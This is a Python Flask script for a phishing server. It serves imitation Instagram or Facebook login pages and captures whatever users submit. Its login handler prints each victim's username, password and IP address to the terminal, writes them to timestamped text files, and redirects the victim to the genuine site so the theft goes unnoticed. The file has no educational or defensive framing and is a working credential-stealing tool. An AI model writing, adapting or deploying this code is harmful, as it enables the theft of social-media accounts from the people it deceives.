from flask import Flask, request, render_template, redirect
from datetime import datetime
import sys
import logging

app = Flask(__name__)

# Disable Flask's default logging for requests
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# Log the credentials and IP to the terminal and save them in files
def log_credentials(username, password, ip):
    # Beautify the terminal output
    print("\n==========================", flush=True)
    print(f"  Username  : {username}", flush=True)
    print(f"  Password  : {password}", flush=True)
    print(f"  IP Address: {ip}", flush=True)
    print("==========================\n", flush=True)
    
    # Generate a filename with a timestamp
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f'id_pass_{timestamp}.txt'
    
    # Save the credentials to a text file
    with open(filename, 'w') as f:
        log_text = f"Username: {username}\nPassword: {password}\nIP: {ip}\n"
        f.write(log_text)

# Serve the Instagram login page
@app.route('/')
def index():
    if platform == 'instagram':
        return render_template('instagram/index.html')
    elif platform == 'facebook':
        return render_template('facebook/index.html')

# Handle login form submission and redirect
@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('uname')
    password = request.form.get('password')
    client_ip = request.remote_addr
    log_credentials(username, password, client_ip)
    
    # Redirect to the appropriate platform after login
    if platform == 'instagram':
        return redirect('https://www.instagram.com')
    elif platform == 'facebook':
        return redirect('https://www.facebook.com')

if __name__ == "__main__":
    if len(sys.argv) != 2 or sys.argv[1] not in ['instagram', 'facebook']:
        print("Usage: python3 login_server.py <instagram|facebook>")
        sys.exit(1)

    platform = sys.argv[1]
    # Run the server on port 5000
    app.run(host='0.0.0.0', port=5000)
